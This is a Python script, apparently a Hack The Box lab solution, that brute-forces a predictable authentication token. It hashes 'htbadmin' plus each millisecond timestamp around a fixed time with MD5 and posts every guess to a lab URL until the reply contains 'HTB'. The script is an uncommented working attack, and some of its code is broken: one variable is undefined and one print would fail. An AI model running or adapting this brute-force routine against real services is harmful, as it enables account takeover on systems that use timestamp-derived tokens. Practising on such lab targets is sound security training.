from hashlib import md5
import requests
from sys import exit
from time import time
from datetime import datetime, timezone
import pytz
from dateutil import parser

url = "http://94.237.56.248:56879/question1/"
"""
data = {"submit": "htbuser"}
date = requests.post(url, data)

print(str(date.headers["Date"]))

# Parse the timestamp
dt_object = datetime.strptime(str(date.headers["Date"]), "%a, %d %b %Y %H:%M:%S %Z")

# Convert the timestamp to UTC
epoch_time = int(dt_object.timestamp())
print(epoch_time)
print("Token Req Status:", date)
print("Request Date:", str(date.headers["Date"]))
print("Dt Object (UTC):", dt_object_utc)
print("Time Stamp (UTC):", dt_object_utc.timestamp())
print("Time Stamp Request Translated (UTC):", int(dt_object_utc.timestamp()) * 1000)
print("System Time:", int(time()) * 1000)
exit()
"""
# to have a wide window try to bruteforce starting from 2 seconds ago ranging to 1 second after
now = int(1706203575) * 1000 # 1000 to make it miliseconds 
start_time = now - 500 # 1000 to go back 1 second
Success  = "HTB"

# loop from start_time to now. + 1 is needed because of how range() works

# Span 4000 miliseconds or 4 seconds
for x in range(start_time, now + 1000): # 1000 to add a second (Should Have Threaded This...)
    # get token md5
    Token = "htbadmin" + str(x)
    md5_token = md5(Token.encode()).hexdigest()
    data = {
        "token": md5_token,
        "submit": "check"
        
    }

    

    # send the request
    res = requests.post(url, data=data)

    print("Token Request Time~{} Token:{} String:{} Req Status:{}".format(now, md5_token, Token, res))

    # response text check
    if Success in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
    else:
        print(f"Failed {res} on URL {url} with data {data}")
        print("Failed", res) # Implicite " "
        print("Failed " + res)
